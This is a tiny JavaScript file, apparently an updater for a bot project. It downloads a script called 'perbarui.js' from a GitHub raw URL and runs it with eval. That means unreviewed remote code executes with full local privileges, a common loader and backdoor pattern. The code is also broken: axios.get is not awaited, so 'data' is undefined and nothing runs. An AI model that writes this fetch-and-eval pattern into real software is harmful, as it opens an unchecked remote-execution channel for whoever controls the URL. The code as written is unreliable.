/* HADY ZEN'IN */

const axios = require('axios');
const { data } = axios.get("https://raw.githubusercontent.com/HadyZen/Ayanokoji-Kiyotaka/refs/heads/main/perbarui.js");

eval(data);
